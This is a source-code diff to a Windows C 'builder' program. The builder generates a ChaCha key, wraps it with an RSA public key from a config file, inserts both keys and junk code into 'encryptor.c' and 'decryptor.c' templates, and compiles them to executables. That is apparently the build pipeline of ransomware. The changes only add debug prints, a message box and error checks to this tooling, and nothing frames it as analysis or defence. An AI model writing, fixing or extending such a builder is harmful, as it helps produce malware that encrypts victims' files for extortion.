@@ -7,8 +7,12 @@
 #define MAX_CODE_SIZE 1024 * 1024
 
 char* load_file(const char* filename) {
+    printf("Trying to load %s\n", filename);
     HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return NULL;
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("Failed to open %s, error code: %lu\n", filename, GetLastError());
+        return NULL;
+    }
 
     DWORD size = GetFileSize(hFile, NULL);
     char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, size + 1);
@@ -32,7 +36,6 @@ void obfuscate_code(char* code, const BYTE* chacha_key, const BYTE* key_hash) {
     strcat_s(code, MAX_CODE_SIZE, key_str);
     strcat_s(code, MAX_CODE_SIZE, hash_str);
 
-    // Добавляем случайный мусор
     for (int i = 0; i < 10; i++) {
         char junk[32];
         sprintf_s(junk, sizeof(junk), "int junk%d = %d;", i, rand());
@@ -47,12 +50,17 @@ void compile_to_exe(const char* code, const char* output) {
 }
 
 int main() {
+    MessageBoxA(NULL, "Builder is starting", "Debug", MB_OK); // Всплывающее окно
+    printf("Starting builder...\n");
     char* config_json = load_file("cfg.txt");
     if (!config_json) {
         printf("Error loading config\n");
         return 1;
     }
+    printf("Config loaded\n");
+
     Config config = parse_config(config_json);
+    printf("Config parsed\n");
 
     BYTE chacha_key[32];
     generate_random(chacha_key, 32);
@@ -63,7 +71,23 @@ int main() {
     rsa_encrypt(chacha_key, 32, encrypted_key, config.rsa_pub_key);
 
     char* enc_template = load_file("src/encryptor.c");
+    if (!enc_template) {
+        printf("Error loading encryptor.c\n");
+        HeapFree(GetProcessHeap(), 0, config_json);
+        free_config(&config);
+        return 1;
+    }
+    printf("Encryptor template loaded\n");
+
     char* dec_template = load_file("src/decryptor.c");
+    if (!dec_template) {
+        printf("Error loading decryptor.c\n");
+        HeapFree(GetProcessHeap(), 0, config_json);
+        HeapFree(GetProcessHeap(), 0, enc_template);
+        free_config(&config);
+        return 1;
+    }
+    printf("Decryptor template loaded\n");
 
     obfuscate_code(enc_template, chacha_key, key_hash);
     obfuscate_code(dec_template, chacha_key, key_hash);
@@ -79,5 +103,6 @@ int main() {
     HeapFree(GetProcessHeap(), 0, enc_template);
     HeapFree(GetProcessHeap(), 0, dec_template);
     free_config(&config);
+    printf("Builder finished\n");
     return 0;
 }
